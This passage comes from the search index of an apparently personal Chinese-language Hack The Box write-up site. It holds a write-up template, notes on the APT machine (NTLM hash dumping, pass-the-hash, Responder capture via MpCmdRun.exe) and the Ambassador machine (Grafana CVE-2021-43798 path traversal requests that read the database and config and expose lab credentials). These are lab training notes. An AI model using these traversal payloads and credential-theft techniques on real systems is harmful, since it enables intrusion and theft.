unknown\n</code></pre></p>","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#_1","title":"\u653b\u51fb\u8def\u5f84\u89c4\u5212\u00b7\u6f0f\u6d1e\u5206\u6790","text":"<p>\u5e38\u89c4\u7b80\u5355\u9776\u673a\uff0c22\u7aef\u53e3SSH\u7684\u7248\u672c\u8f83\u65b0\uff0c\u4f18\u5148\u5ea6\u653e\u4f4e\u3002\u5148\u770b80\u7aef\u53e3\u7684Web\u3002</p>","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#80","title":"80\u7aef\u53e3","text":"<ul> <li>robots.txt\uff1a\u65e0</li> <li>.git/config\uff1a\u65e0</li> <li>\u7f51\u9875\u4fe1\u606f\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> <li>\u7f51\u9875\u6e90\u7801\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> <li>\u7f51\u9875\u529f\u80fd\uff1axxxx</li> <li>\u5b50\u57df\u679a\u4e3e\uff1a\u65e0\u57df\u540d/\u65e0\u7279\u522b\u53d1\u73b0</li> <li>\u76ee\u5f55\u679a\u4e3e\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> </ul>","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#_2","title":"\u7814\u7a76\u7f51\u9875\u529f\u80fd","text":"","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#_3","title":"\u5b50\u57df\uff1a","text":"","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#xx","title":"xx\u7aef\u53e3","text":"","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#initial-access","title":"Initial Access","text":"","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#poc-cve-yyyy-xxxx","title":"PoC (CVE-yyyy-xxxx)","text":"","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#flag-user","title":"flag: user","text":"","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#privilege-escalation","title":"Privilege Escalation","text":"","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#internal-recon","title":"Internal Recon","text":"<p>\u57fa\u7840\u4fe1\u606f\u6536\u96c6\u4e00\u628a\u68ad\uff1a</p> <ul> <li>IP\u3001\u7aef\u53e3</li> <li>\u7528\u6237\u5bb6\u76ee\u5f55\u7684\u9690\u85cf\u6587\u4ef6\uff1a\u65e0</li> <li>\u73af\u5883\u53d8\u91cf\uff1a<code>env</code></li> <li><code>sudo -l</code>\uff1a\u6ca1\u6709sudo\u53ef\u6267\u884c</li> <li>SUID\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> <li>\u53ef\u5199\u6587\u4ef6\uff1a<code>find /etc -writable -ls 2&gt;/dev/null</code></li> <li>cron\uff1a<code>crontab -l</code>\uff0c<code>ls /etc/cron*</code>\uff0c\u65e0\u7279\u522b\u53d1\u73b0</li> <li>\u5176\u4ed6\u76ee\u5f55\uff1a<ul> <li><code>/interesting_folder</code></li> <li><code>/var/www/interesting_folder</code></li> <li><code>/var/mail/user_name</code></li> <li><code>/opt/interesting_folder</code></li> <li><code>/usr/local/interesting_folder</code></li> <li><code>/usr/local/bin/interesting_folder</code></li> <li><code>/usr/local/share/interesting_folder</code></li> <li><code>/etc/hosts</code></li> <li><code>/tmp</code></li> <li><code>/mnt</code></li> <li><code>/media</code></li> <li><code>/etc</code></li> </ul> </li> </ul>","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#poc-cve-yyyy-xxxx_1","title":"PoC (CVE-yyyy-xxxx)","text":"","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#flag-root","title":"flag: root","text":"","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/active/writeup-template/#_4","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2024/MM/DD</p> <p>\u2026\u2026</p>","tags":["HTB/Easy","HTB/Linux","HTB/Medium","HTB/Windows"]},{"location":"writeup/retired/HTB-APT/","title":"HTB-APT","text":"<p>\u6b64\u9776\u673a\u5e76\u975e\u81ea\u5df1\u6240\u6253\uff0c\u8fd9\u7bc7WP\u53ea\u662f\u770b\u7ea2\u961f\u7b14\u8bb0\u7684\u9776\u673a\u5b9e\u64cd\u505a\u7684\u4e00\u70b9\u7b14\u8bb0\u3002</p>"},{"location":"writeup/retired/HTB-APT/#_1","title":"\u6f0f\u6d1e\u5206\u6790","text":""},{"location":"writeup/retired/HTB-APT/#80","title":"80\u7aef\u53e3","text":"<p>\u552f\u4e00\u4e00\u4e2a\u52a8\u6001\u529f\u80fdPOST\u8fde\u63a5\u4e0d\u4e0aweb\u540e\u7aef\u3002\u6e90\u7801\u53d1\u73b0\u8fd9\u4e2a\u7f51\u9875\u5c31\u662f\u90a3\u4e2aweb\u540e\u7aef\u7684\u955c\u50cf\u3002\u641c\u4e00\u6ce2\u955c\u50cf\u5de5\u5177\u6ca1\u53d1\u73b0\u5229\u7528\u3002</p>"},{"location":"writeup/retired/HTB-APT/#135web593","title":"135\u7aef\u53e3\uff08\u63d0\u4f9bweb\u670d\u52a1\u65f6\u662f593\uff09","text":"<ul> <li>\u4e00\u822cRPC\u534f\u8bae\u4e0a\u4f1a\u8dd1DCOM\u670d\u52a1\uff0c\u4ee5\u89e3\u51b3\u57fa\u4e8e\u7f51\u7edc\u7684\u4e92\u64cd\u4f5c\uff0c\u5404\u7ec4\u4ef6/\u65b9\u6cd5\u4ee5UUID\u8bc6\u522b\u3002</li> <li><code>rpcclient</code>\uff08\u9ed8\u8ba4\u8fde\u63a5\u7aef\u53e3139\u800c\u4e0d\u662f135\uff0c\u6240\u4ee5\u8981\u6307\u5b9a\uff09</li> <li>(impacket) <code>rpcdump.py</code>\uff08\u53ef\u4ee5\u76f4\u63a5\u628aimpacket\u8def\u5f84\u52a0\u5165PATH\uff1a<code>export PATH=/usr/share/doc/python3-impacket/examples:$PATH</code>\uff09</li> <li>(impacket) <code>rpcmap.py</code>\uff1arpcdump\u540e\u4e0d\u77e5\u9053\u5404\u7ec4\u4ef6\u662f\u5e72\u561b\u7684\u2014\u2014\u66b4\u7834/\u6620\u5c04UUID\u7684\u4fe1\u606f\u3002\u627e\u5230\u5bf9\u5e94\u65b9\u6cd5\u80fd\u679a\u4e3e\u51fa\uff08\u54ea\u91cc\u7684\uff1f\uff09\u7f51\u5361ip\u2014\u2014IPv6\u2014\u2014\u518d\u6b21nmap\u626b\u7aef\u53e3</li> </ul>"},{"location":"writeup/retired/HTB-APT/#445","title":"445","text":"<ul> <li><code>smbclient</code> \u4e0b\u8f7dbackup.zip</li> <li><code>unzip -l file</code> \u5217\u51fa\uff0c\u91cc\u9762\u6709ntds\u548c\u6ce8\u518c\u8868</li> <li>\uff08<code>updatedb</code> \u66f4\u65b0locate\u547d\u4ee4\u6570\u636e\u5e93\uff09</li> </ul>"},{"location":"writeup/retired/HTB-APT/#_2","title":"\u8865\u5145\u4e00\u70b9\u7aef\u53e3\u77e5\u8bc6","text":""},{"location":"writeup/retired/HTB-APT/#47001-winrm","title":"47001\u7aef\u53e3 winrm","text":"<pre><code>\u5982\u679c\u90e8\u7f72\u4e86winrm\u5c31\u4f1a\u670947001\uff1b  \n\u5982\u679c\u8bbe\u7f6e\u5b8c\u6210\u5c31\u67095985 wsman\uff1b  \n\u5982\u679c\u52a0\u4e86ssl\u5c31\u67095986\u3002\n</code></pre>"},{"location":"writeup/retired/HTB-APT/#49152","title":"49152\uff5e \u52a8\u6001\u7aef\u53e3\u3002\u4e0d\u592a\u770b","text":""},{"location":"writeup/retired/HTB-APT/#_3","title":"\u57df\u6e17\u900f\u56fa\u5b9a\u601d\u8def","text":"<ol> <li><code>(impacket) secretdump.py -ntds ntds.dit -system register/SYSTEM LOCAL</code>\uff08\u53ef\u5728\u7ebf\u4e5f\u53ef\u672c\u5730\u8f6c\u50a8\uff09\u3010\uff1f\u67e5\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u9700\u8981\u6ce8\u518c\u8868\u4fe1\u606f\uff1f\u3011</li> <li>\u7531\u4e8e5985 wsman\u662f\u5f00\u653e\u7684\uff0c\u6709\u4e86hash\u53ef\u76f4\u63a5\u7528 <code>evil-winrm</code> \u5c1d\u8bd5\u9ad8\u6743\u9650\u7528\u6237\u7684pth\uff08\u6ce8\u610fhash\u683c\u5f0f\uff0c\u56e0\u4e3a\u7b2c\u4e00\u6bb5\u53ef\u80fd\u662f\u7a7a\u7684LMhash\uff09\u3002\u5176\u4ed6\u5f88\u5177\u4f53\u7684\u666e\u901a\u4eba\u540d\u8d26\u6237\u4f30\u8ba1\u90fd\u662f\u4f4e\u6743\u9650</li> <li>\u5907\u4efd\u6587\u4ef6\u7684\u65f6\u6548\u6027\u4f4e\uff0c\u4e0d\u77e5\u9053\u5f53\u524d\u65f6\u95f4\u70b9\u54ea\u4e9b\u8d26\u6237\u6709\u7528\u2014\u2014hash\u78b0\u649e\uff08\u56e0\u4e3a\u4e0d\u540c\u5bc6\u7801\u751f\u6210\u7684hash\u6709\u53ef\u80fd\u76f8\u540c\uff09<ul> <li>\u800c\u7531\u4e8e\u7528\u6237\u592a\u591a\uff0c\u76f4\u63a5\u78b0\u649e\u7684\u8bdd\u8ba1\u7b97\u91cf\u592a\u5927\u2014\u2014\u7528\u6237\u7b5b\u9009\uff0c\u770b\u770b\u54ea\u4e2a\u7528\u6237\u6709\u6548\uff08\u5982\u9776\u673a\u672c\u67652000\u7528\u6237\u21923\u7528\u6237\uff09\u2014\u2014\u9884\u8ba4\u8bc1\u673a\u5236\u2014\u2014\u7528 <code>kerbrute</code> \u6216\u8005nmap\u811a\u672c <code>krb5-enum-users</code>\uff08\u540e\u8005\u5feb\u5f88\u591a\uff09 \u7b5b\u9009\u5b8c\u7528\u6237\u540e\uff0c\u53bb\u78b0\u649e\u672c\u6765\u76842000\u4e2ahash</li> <li><code>crackmapexec</code> \u591a\u6b21\u5c1d\u8bd5\u540e\u88abban \u3010\uff1f\u4f46\u662f\u5176\u5b9e\u5e94\u8be5\u9996\u5148\u5c1d\u8bd5ntds\u91cc\u6709\u6548\u7528\u6237\u5bf9\u5e94\u7684hash\uff1f\u3011</li> <li><code>getTGT.py</code> \u3010\uff1fgetTGT\u8ba4\u8bc1\u9519\u8bef\u6b21\u6570\u8fc7\u591a\u7684\u8bdd\u4e0d\u77e5\u9053\u4f1a\u4e0d\u4f1a\u4e5f\u4f1a\u88abban\uff1f\u3011<ul> <li>\uff08<code>watch</code> \u547d\u4ee4\uff0c\u6b64\u5904\u7528\u4e8e\u76d1\u89c6getTGT\u4fdd\u5b58\u5230\u672c\u5730\u7684\u6709\u6548\u7528\u6237\u4fe1\u606f\uff09</li> </ul> </li> </ul> </li> <li>\u627e\u5230\u4e00\u4e2a\u6709\u6548\u7528\u6237\uff08\u8be5\u7528\u6237\u80fd\u83b7\u53d6TGT\u5373\u8bf4\u660e\u8be5\u8d26\u6237&amp;hash\u7684\u7ec4\u5408\u662f\u5bf9\u7684\uff09</li> <li>\u56de\u5230 <code>evil-winrm</code> \u5c1d\u8bd5\u8fde\u63a5\uff08\u6709hash\u4e86\u5c31\u5c1d\u8bd5\u6a2a\u5411\u79fb\u52a8\uff09</li> <li>\u4e0d\u884c\u518d\u8bd5\u8bd5\u5176\u4ed6\u6a2a\u5411\u79fb\u52a8\u5de5\u5177\u2014\u2014<code>psexec</code>\uff0c<code>wmiexec</code>\uff0c<code>dcomexec</code>\uff0cimpacket\u91cc\u7684<code>\u5404\u79cdexec</code> \u3010\u6709\u5fae\u5999\u7684\u533a\u522b\u3002\u7559\u5751\uff0c\u4ee5\u53ca\u4ee5\u540e\u5b9e\u9a8c\u770b\u770b\u65e5\u5fd7\u533a\u522b\u3011</li> <li>\u7528\u6237\u65e0\u6743\u9650\u6267\u884c\u5404\u79cdexec\u7684\u8bdd\uff0c<code>reg.py</code> (\u5373Windows\u7684reg.exe)\u6536\u96c6\u6ce8\u518c\u8868\u4fe1\u606f\u3002 \u6e17\u900f\u4e2dHKU\u6839\u952e\u53casoftware\u7b49\u8f83\u5e38\u88ab\u5229\u7528\uff08\u90fd\u56e0\u4e3a\u8fd9\u91cc\u901a\u5e38\u4fdd\u5b58\u7528\u6237/\u5e94\u7528\u51ed\u636e\u76f8\u5173\u7684\u4fe1\u606f\uff09</li> </ol>"},{"location":"writeup/retired/HTB-APT/#get-shell","title":"get shell","text":"<p>\u62ff\u5230\u660e\u6587\u5bc6\u7801\uff0c\u5c1d\u8bd5 <code>evil-winrm (-p)</code></p>"},{"location":"writeup/retired/HTB-APT/#_4","title":"\u63d0\u6743","text":""},{"location":"writeup/retired/HTB-APT/#_5","title":"\u641c\u96c6\u654f\u611f\u6587\u4ef6","text":"<p>\u4e00\u4e2a\u633a\u806a\u660e\u7684\u65b9\u6cd5\uff1a\u770b\u6587\u4ef6\u5305\u542b\u662f\u5229\u7528\u7684\u4ec0\u4e48\u6587\u4ef6\u3002\u6e05\u5355\u8d44\u6e90\uff1aAuto_Wordlists</p> <p>\u53d1\u73b0powershell\u5386\u53f2\u547d\u4ee4\u5c06NTLM\u6539\u6210\u4e86v1\uff08\u6613\u7834\u89e3\uff09\u3002</p>"},{"location":"writeup/retired/HTB-APT/#responder","title":"Responder","text":"<p>\u5185\u7f51\u6e17\u900f\u4e4bResponder\u653b\u9632\uff08\u4e0a\uff09</p> <p>\u5f00\u542fResponder\uff0c\u7136\u540e\u6839\u636eLOLBAS\u5728\u76ee\u6807\u673a\u5229\u7528Windows Defender\u7684 <code>MpCmdRun.exe</code> \u8bbf\u95eekali\u7684IP\u3010\uff1f\u5e94\u8be5\u4e5f\u80fd\u7528powershell\uff1f\u5b9e\u9a8c\u770b\u770b\u751f\u6210\u7684\u65e5\u5fd7\u533a\u522b\u3011\uff0c\u6355\u83b7ntlmv1\uff08APT$\u7528\u6237\uff09</p> <p>Responder\u53ef\u4ee5\u76d1\u542c\u591a\u4e2a\u7aef\u53e3\uff0c\u4f7f\u7528\u591a\u4e2a\u534f\u8bae\uff0c\u6240\u4ee5\u4e0d\u4e00\u5b9a\u9700\u8981\u6295\u6bd2\u3001\u540d\u5b57\u89e3\u6790\u624d\u80fd\u6355\u83b7hash\u3002\u5bf9\u4e8e\u76f4\u63a5\u8bbf\u95eeIP\uff0c\u8d70HTTP\u3001\u7528SMB\u7684UNC\u8def\u5f84\u7b49\u90fd\u662f\u53ef\u4ee5\u6355\u83b7\u7684</p> <p><code>ntlmv1-multi</code>\uff08\u6216 <code>hashcat</code> \u7b49\uff09 \u7834\u89e3\u5f97\u5230hash\u2014\u2014\u300a\u600e\u4e48\u53bb\u4f7f\u7528\u300b</p> <ul> <li>\u518d\u7528 <code>evil-winrm</code>\uff0c\u53ef\u4ee5\uff0c\u4f46\u505a\u7684\u4e8b\u4f30\u8ba1\u548c\u4e4b\u524d\u6ca1\u4ec0\u4e48\u533a\u522b\u3002</li> <li>\u9664\u4e86\u60f3\u5230\u7528\u5404\u79cd\u6a2a\u5411\u79fb\u52a8\u5de5\u5177\u83b7\u5f97\u66f4\u591a\u8d44\u4ea7\u4e4b\u5916\uff0c\u6211\u4eec\u8fd8\u8981\u60f3\u5230\u80fd\u5426\u901a\u8fc7APT$\u8d26\u6237\u505a\u66f4\u9ad8\u6743\u9650\u7684\u4e8b\u3001\u62ff\u5230\u6574\u4e2a\u7cfb\u7edf\u6743\u9650\u3002\u5982\uff1a\u4e4b\u524d\u53ea\u62ff\u5230\u4e86\u5907\u4efd\u7684\u7528\u6237&amp;hash\uff0c\u80fd\u5426\u62ff\u5230\u76ee\u524d\u7684\u7528\u6237\u5e93\u5462\u3002</li> </ul> <p>\u6240\u4ee5: <code>secretdump.py</code>\uff08\u4e8b\u5b9e\u4e0a\uff0c\u8fd9\u4e2a\u5de5\u5177\u7684\u529f\u80fd\u662f\u548cDC\u540c\u6b65\uff09 \u6210\u529f\u83b7\u53d6\u6700\u65b0\u7528\u6237&amp;hash\uff08\u91cc\u9762\u6709admin\u8d26\u6237\uff0c\u524d\u6587\u8bf4\u7684\u83b7\u53d6\u6574\u4e2a\u7cfb\u7edf\u6743\u9650\u5373\u8fd9\u4e2a\uff09</p>"},{"location":"writeup/retired/HTB-Ambassador/","title":"HTB-Ambassador","text":"","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#_1","title":"\u626b\u63cf","text":"<p>\u679c\u7136\u7528\u4e4b\u524d\u5199\u7684\u5bf9Easy\u673a\u5668\u7684\u626b\u63cf\u811a\u672c\u4e0d\u5927\u597d\u4f7f\u4e86\u554a\u2026\u2026 \u81ea\u5df1 <code>curl -I</code> \u770b\u4e86\u773cHTTP\u54cd\u5e94\u5934\u771f\u6ca1\u6709\u57df\u540d\u4fe1\u606f\u3002\u5f00\u6d4f\u89c8\u5668\u548cBurp\u8bbf\u95ee\u4e00\u4e0b\u76ee\u6807IP\uff0c\u7adf\u7136\u6ca1\u6709\u62e6\u622a\u5230\u8bf7\u6c42\uff08\u4e0d\u8fc7\u8bbf\u95ee <code>/robots.txt</code> \u53c8\u80fd\u62e6\u622a\uff09\uff1f\u4e0d\u662f\u5f88\u61c2\u2026\u2026</p> <p>\u8fd8\u662f\u5148\u56de\u5230\u901a\u5e38\u7684\u6d41\u7a0b\u5427\uff0c\u5148\u8fdb\u884c\u626b\u63cf\u3002 \u4ee5\u9632Medium\u96be\u5ea6\u7684\u673a\u5668\u4f1a\u5f00\u542f\u5927\u7aef\u53e3\uff0c\u5c31\u626b\u4e00\u4e0b\u6240\u6709\u7aef\u53e3\u5427\uff1a <pre><code>$ nmap -p- --min-rate=5000 10.10.11.183 -oN allPortScan.nmap\n\n$ cat allPortScan.nmap | grep open | awk -F '/' '{print $1}' | tr '\\n' ',' | sed \"s/,$//\" \n22,80,3000,3306\n</code></pre></p> <p>\u7136\u540e\u8be6\u7ec6\u626b\u63cf\u8fd9\u51e0\u4e2aopen\u7aef\u53e3\uff1a <pre><code>sudo nmap -v -n -Pn -p 22,80,3000,3306 -sV -O --script=vuln 10.10.11.183 -oN 10.10.11.183.nmap\n</code></pre></p>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#_2","title":"\u6f0f\u6d1e\u5206\u6790","text":"<ul> <li>22/TCP: SSH\u4f18\u5148\u5ea6\u6700\u4f4e\uff0c\u5148\u4e0d\u770b\u3002</li> <li>80/TCP: HTTP\uff0c\u4f18\u5148\u5ea61\u3002</li> <li>3000/TCP: nmap\u626b\u51fa\u201cppp?\u201d\uff0c\u4e0d\u8fc7\u770bvuln\u811a\u672c\u626b\u51faHTTP\u5934\u7684\u6837\u5b50\uff0c\u4f18\u5148\u5ea62\u3002</li> <li>3306/TCP: MySQL\uff0c\u4f30\u8ba1\u6709\u4e86\u8d26\u53f7\u5bc6\u7801\u4e4b\u540e\u662f\u53e6\u4e00\u4e2a\u7a81\u7834\u53e3\uff0c\u4f18\u5148\u5ea63\u3002</li> </ul>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#80","title":"80\u7aef\u53e3","text":"<ul> <li>robots.txt\uff1a\u65e0</li> <li>\u7f51\u9875\u6e90\u7801\uff1aHugo 0.94.2\uff0cCSS\u7684path\u770b\u5230 <code>ananke</code>\uff0c\u641c\u4e86\u4e0b\u662fHugo\u7684\u4e3b\u9898</li> <li>\u5b50\u57df\u679a\u4e3e\uff1a\u56e0\u4e3a\u6ca1\u53d1\u73b0\u57df\u540d\u6240\u4ee5\u4e0d\u679a\u4e3e\u4e86</li> <li>\u76ee\u5f55\u679a\u4e3e\uff1a\u626b\u4e86\u4e2a <code>directory-list-2.3-medium.txt</code> \u65e0\u53d1\u73b0</li> <li>\u7f51\u9875\u529f\u80fd\uff1a\u4f3c\u4e4e\u5c31\u662f\u4e00\u4e2a\u9759\u6001\u9875\u9762\u3002</li> </ul> <p>\u603b\u7684\u6765\u8bf4\uff0c\u6682\u65f6\u6ca1\u53d1\u73b0\u7a81\u7834\u53e3\u3002</p>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#3000-grafana","title":"3000\u7aef\u53e3: Grafana","text":"<p>\u7f51\u9875\u6e90\u7801\uff1a  </p> <ul> <li>\"buildInfo\"\u91cc\u6709 <code>\"version\": \"8.2.0\"</code></li> <li><code>\"subTitle\": \"Grafana v8.2.0 (d7f71e9eae)\"</code></li> </ul> <p>\u77e5\u9053\u7248\u672c\u5c31\u597d\u529e\u4e86\uff0c\u8c37\u6b4c <code>grafana version 8.2.0 exploit</code> \u53d1\u73b0\u6f0f\u6d1e\u3002</p>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#poc-cve-2021-43798","title":"PoC (CVE-2021-43798)","text":"<p>https://github.com/jas502n/Grafana-CVE-2021-43798 https://grafana.com/blog/2021/12/07/grafana-8.3.1-8.2.7-8.1.8-and-8.0.7-released-with-high-severity-security-fix </p> <p>\u7f51\u9875\u6e90\u7801\u91cc\u4e5f\u786e\u5b9e\u6709\u4e0a\u9762\u6587\u7ae0\u63d0\u5230\u7684plugin\uff0c\u5982alertlist\u3002 \u7136\u540e\u5b66\u7740github\u91cc\u7684\u6837\u5b50\uff0c\u83b7\u53d6\u654f\u611f\u6587\u4ef6\u5373\u53ef\u3002  </p> <p>\u6d4f\u89c8\u5668\u8bbf\u95ee\u4f3c\u4e4e\u4e0d\u884c\uff0c\u4f1a\u81ea\u52a8\u628a <code>../</code> \u90fd\u5220\u6389\uff08\u540e\u6765\u53d1\u73b0\u539f\u6765\u4e2d\u95f4\u7684\u659c\u6760\u9700\u8981URL\u7f16\u7801\u2026\u2026\uff09\uff0c\u7528Burp\u53d1\uff0c\u6210\u529f\u83b7\u53d6\u54cd\u5e94\u3002\u5185\u5bb9\u592a\u957f\u4e86\uff0c\u53f3\u952e\u4fdd\u5b58\u5230\u672c\u5730\uff1a <pre><code>GET /public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db HTTP/1.1\n\nGET /public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini HTTP/1.1\n</code></pre></p> <p></p> <p>\u8fd9\u91cc\u76f4\u63a5 <code>grep grafana.db</code> \u4f1a\u6709\u4ec0\u4e48bin\u6587\u4ef6\u62a5\u9519\u3002\u540e\u6765\u624d\u53d1\u89c9\u8fd9\u4e2a\u5c31\u771f\u662f\u6574\u4e2aDB\u5e93\uff0c\u53ef\u4ee5\u5728\u672c\u5730\u7528SQL\u547d\u4ee4\u8fdb\u884c\u8bbf\u95ee\u7684</p> <pre><code>$ strings grafana.db | grep admin\n, `is_admin` INTEGER NOT NULL\n, `is_admin`\n, `is_admin`\n, `is_admin` INTEGER NOT NULL\n, `is_admin` INTEGER NOT NULL\n+       adminadmin@localhost\n        admin\nadminadmin@localhostdad0e56900c3be93ce114804726f78c91e82a0f0f0f6b248da419a0cac6157e02806498f1f784146715caee5bad1506ab0690X27trve2uf960YdtaMF2022-03-13 20:26:452022-09-01 22:39:382022-12-23 10:33:36\n\n\n$ cat grafana.ini\n\n#################################### Security ####################################\n[security]\n# disable creation of admin user on first start of grafana\n;disable_initial_admin_creation = false\n\n# default admin user, created on startup\n;admin_user = admin\n\n# default admin password, can be changed before first start of grafana,  or in profile settings\nadmin_password = messageInABottle685427\n\u2026\u2026\n</code></pre> <p>\u6536\u96c6\u5230\u4e0a\u9762\u8fd9\u4e9b\u4fe1\u606f\uff0c\u4e0d\u8fc7\u4e0d\u61c2\u5982\u4f55\u4f7f\u7528\u3002 \u90a3\u4e2aadmin\u8d26\u6237\u5bc6\u7801\u80fd\u767b\u9646\u8fdbGrafana\uff0c\u4f46\u662f\u8fdb\u53bb\u4e86\u597d\u50cf\u4e5f\u5e76\u6ca1\u6709\u4ec0\u4e48\u7528\u3002  </p>","tags":["HTB/Medium","HTB/Linux"]},{"location":"writeup/retired/HTB-Ambassador/#grafanadb","title":"\u83b7\u53d6grafana.db\u4fe1\u606f","text":"<p>\u540e\u6765\u53d1\u73b0\u8fd9\u7bc7\u6587\u7ae0\uff1a</p> <p>https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798</p> <p>\u6d4f\u89c8\u5668\u8bbf\u95ee <code>http://10.10.11.183:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar/lib/grafana/grafana.db</code> \u518d\u6b21\u83b7\u53d6DB\u6587\u4ef6\u3002\uff08\u4e4b\u524d\u5728Burp\u53f3\u952e\u4fdd\u5b58\u7684\u90a3\u4e2a\u7531\u4e8e\u5e26\u4e86HTTP\u5934\uff0c\u8fdb\u5165DB\u6267\u884c\u6709\u4e9b\u547d\u4ee4\u65f6\u4f1a\u62a5\u9519\uff09</p> <p>\u611f\u89c9\u8fd9\u7bc7\u5199\u5f97\u6bd4\u8f83\u6e05\u6670\u4e86\uff0c\u8ddf\u7740PoC\u6587\u7ae0\u8bd5\u8bd5\u3002 \u8fd9\u65f6\u5019\u624d\u660e\u767d\u4e86\u4e0a\u9762Github\u6587\u7ae0\u91cc\u8bf4\u7684\u4ec0\u4e48data source\u52a0\u5bc6\u3002\u800c\u4e00\u5f00\u59cb\u56e0\u4e3aGithub\u548c\u8fd9\u7bc7\u6587\u7ae0\u90fd\u63d0\u5230\u90a3\u4e2a\u52a0\u5bc6\uff0c  </p> <p>Note: Data sources store passwords and basic auth passwords in secureJsonData encrypted (AES-256 in CFB mode) by default.  </p> <p>\u5bfc\u81f4\u6211\u8fc7\u4e8e\u5173\u6ce8 <code>data_source</code> \u8868\u91cc\u7684\u5bf9\u5e94\u5b57\u6bb5\uff0c\u53d1\u73b0\u662f <code>{}</code> \u5565\u90fd\u6ca1\u6709\u4e8e\u662f\u5c31\u61f5\u4e86\u2026\u2026</p> <p>\u8fdb <code>grafana.db</code> \u5230\u5904\u770b\u770b\uff0c\u53d1\u73b0 <code>user</code> \u8868\u91cc\u9762\u6709\u4e2aadmin\u7684\u8d26\u6237\u548c\u7591\u4f3c\u52a0\u5bc6\u7684\u5bc6\u7801\uff0c\u4f46\u662f\u770b\u4e0a\u53bb\u4e0d\u662f\u90a3\u4e48\u5bb9\u6613\u80fd\u89e3\u5bc6\u2026\u2026\u4ee5\u53ca\u731c\u6d4b\u8fd9\u4e2a\u53ef\u80fd\u5c31\u662f\u6211\u521a\u521a\u767b\u8fdbGrafana\u7684admin\u8d26\u6237\u5bc6\u7801\u3002   </p> <pre><code>sqlite3 grafana.db\nsqlite&gt; .tables\nsqlite&gt; select * from data_source;\n2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2022-12-25 03:56:57|0|{}|1|uKewFgM4z\n\nsqlite&gt; select * from user;\n1|0|admin|admin@localhost||864a9461c490435c1743f73ed43c215ecfafe48423b6ad1a5feeb893829a48a908920761180b1bbba525982e241390f98205|0X27trve2u|f960YdtaMF||1|1|0||2022-03-13 20:26:45|2022-12-24 16:25:07|0|2022-12-24 16:32:31|0\n</code></pre> <p>\u53c8\u5728Grafana\u91cc\u8f6c\u4e86\u4e24\u5708\uff0c\u770b\u5230Configuration\u83dc\u5355\u91cc\u7684Data source\u548cUsers\u3002 \u5176\u4e2dUsers\u91cc\u9762\u5c31\u662f\u6211\u767b\u9646\u8fdb\u6765\u7684admin\u8d26\u6237\uff0c\u6240\u4ee5\u4e0a\u9762\u7684\u731c\u60f3\u53c8\u66f4\u6df1\u4e86\u4e00\u5206\u3002\u800cData source\u91cc\u9762\u6709\u521a\u521a\u5728 <code>grafana.db</code> \u91cc\u770b\u5230\u7684\u90a3\u4e2a <code>mysql</code>\uff0c\u539f\u6765\u662f\u5bf9\u5e94\u7740\u8fd9\u91cc\u554a\u3002 </p> <p>\u53c8\u60f3\u60f3\u521a\u521a\u770b <code>data_source</code> \u8868\u90fd\u6ca1\u6709\u660e\u767d\u5404\u5217\u662f\u4ec0\u4e48\u610f\u601d\uff0c\u641c\u4e86\u4e00\u4e0bsqlite\u5c55\u793a\u5217\u540d\u7684\u8bed\u6cd5\uff1a <pre><code>sqlite&gt; PRAGMA table_info(data_source);\n0|id|INTEGER|1||1\n1|org_id|INTEGER|1||0\n2|version|INTEGER|1||0\n3|type|TEXT|1||0\n4|name|TEXT|1||0\n5|access|TEXT|1||0\n6|url|TEXT|1||0\n7|password|TEXT|0||0\n8|user|TEXT|0||0\n9|database|TEXT|0||0\n10|basic_auth|INTEGER|1||0\n11|basic_auth_user|TEXT|0||0\n12|basic_auth_password|TEXT|0||0\n13|is_default|INTEGER|1||0\n14|json_data|TEXT|0||0\n15|created|DATETIME|1||0\n16|updated|DATETIME|1||0\n17|with_credentials|INTEGER|1|0|0\n18|secure_json_data|TEXT|0||0\n19|read_only|INTEGER|0||0\n20|uid|TEXT|1|0|0\n\nsqlite&gt; PRAGMA 